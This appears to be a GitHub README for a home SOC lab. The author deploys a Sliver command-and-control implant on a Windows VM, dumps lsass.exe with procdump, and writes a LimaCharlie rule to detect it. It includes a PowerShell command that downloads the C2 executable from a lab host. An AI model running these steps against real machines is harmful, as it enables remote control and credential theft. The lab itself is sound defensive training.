# SOC-Analyst

## Set up VMs environment
- I set up 2 VMs, one is Ubuntu Server 22.04, the other is Windows 10 Desktop
- After setting up completely, I install sysmon in Windows 10 VM by this following Powershell script steps
1. Download Sysmon
```powershell
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
2. Unzip Sysmon.zip
```powershell
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
## Start to attack
- I use LimaCharlie (a SecOps cloud platform)
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/bdce3c63-38eb-42a6-81f6-626cfc5138e1)
- Follow these steps, and I reach this. It successfully creates the sensor
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/a9985c93-978d-4c3a-83d8-5d23d9e3f49b)
- Add rules to LimaCharlie
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/c60a1a58-90f5-49e8-9fc8-57e6c32b2feb)
- Use Sliver to perform Command and Control 
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/ed2188db-ed14-4deb-ba1e-04fbe77b4733)
- Download Command and Control file to Windows by this command
```powershell
IWR -Uri http://192.168.159.100/NORMAL_PUDDING.exe -Outfile C:\Users\hoang\Downloads\NORMAL_PUDDING.exe
```
- After running C2 on Windows VM, on Ubuntu Server, I see this
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/33fc3013-56ff-4faf-8156-b509c7033f27)
- Perform RCE
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/6335a1a3-c0a5-4ee5-aa38-a7144931a26d)
- Use ```getprivs``` to see our priviledge in victim, at here, we can see **SeDebugPriviledge** is enabled
![Screenshot 2024-04-21 215813](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/7d000552-743a-4aa6-802e-d14cb519e869)


## Observe and analyse 
- As we can see here, the C2 payload is malicious processes, so they are not signed and they are active on network
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/f34352b8-d9c6-4f33-a0d8-13837a7796bf)
- In the network tab, we can see the C2 payload NORMAL_PUDDING is established
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/e07f3d9a-3a6d-4aa1-aa01-064be6df2920)
- In the file system tab, we can inspect the malicious file on VirusTotal
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/42e58ff3-2bde-47f2-94b6-5e2960a68315)

## Detect malicious processes
- **lsass.exe** is a sensitive process, and it is often targeted by dumping tools. So, many EDR will generate events for it.
- We can find it through Timeline tabs and filtered by SENSITIVE...You can see its paths to lsass.exe
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/c06192be-cddc-4e04-a19a-4026803b5d31)
- Now, I have understood about its structure (leads to lsass.exe), so I will write rules to detect any processes lead to lsass.exe. Here is my rule
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/1574783d-1c6e-4fb1-a67e-284e8dbb7942)
> The rule above only detects process that ends with lsass.exe
- In the respond section, I write like this<br>
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/6c3a9a12-0cc3-4240-b743-675393bdff8f)
> We’re telling LimaCharlie to simply generate a detection “report” anytime this detection occurs.
- When I click Test Event, I can see the respond saying that it successfully detect it.
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/4a0f51b7-e469-4f2d-a227-e85c93556df1)
- Save the rule<br>
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/ef1715b8-38f8-4ff5-b371-696b7824bb59)
- I go to Linux VM and run ```procdump``` again.
![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/c58e9a16-d26f-4012-9f1a-98810cc506cd)
- In the detection section of LimaCharlie, I see this alert
![Screenshot 2024-04-21 224004](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/3ee2f60c-af41-44c5-9bd0-c510c506c176)
- **I have successfully created rule and detected a malicious process**


















